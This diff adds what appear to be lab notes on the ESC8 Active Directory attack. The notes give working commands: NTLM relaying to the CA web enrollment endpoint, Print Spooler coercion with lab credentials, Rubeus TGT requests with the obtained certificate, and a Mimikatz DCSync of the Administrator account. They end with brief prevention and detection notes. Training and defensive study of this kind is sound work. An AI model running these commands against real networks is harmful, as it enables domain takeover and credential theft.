@@ -1,0 +1,70 @@
+Description:
+
+  - ESC8 technique.
+
+  - Abusing relaying to ADCS to obtain a certificate
+
+
+Attacks:
+
+  - Configure NTLMRelayx to forward incoming connections to the HTTP endpoint of the CA
+
+  - Specify that we want to obtain a certificate for hte DC (a default template in AD, which Domain Controllers use for client authentication)
+
+  - The --adcs switch makes NTLMRelayx parse and displays the certificate if one is received.
+
+    impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs
+
+  - Get DC to connect to us
+
+  - Utilize the Print Spooler bug and force a reverse connection to us 
+    - Forcing DC2 to connect to the Kali machine while we have NTLMRelayx listening in another terminal
+
+    python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123
+
+  - Switching back to the NTLMRelayx terminal, we see the request from DC2 was successsful and certificate was obtained
+
+  - copy the obtained base64-encoded certificate, switch to the Windows machine, and use Rubeus to the certificate to authenticate with and obtain a TGT:
+
+    .\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:XXXXXXXXXX<SNIP>
+
+  - With the TGT for DC2, we can now trigger DCSync with Mimikatz
+
+    .\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
+
+
+Prevention:
+
+  - Possible because 
+    - Managed to coerce DC2 successfully
+    - ADCS web enrollment does not enforce HTTPS otherwise relaying would have failed
+  - Regularly scan environment with Certify to find potential issues.
+
+
+Detection:
+
+  - Event ID 4886 and 4887 
+
+  - Also, Logon from IP addresses that do not match the static IP of DC1 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
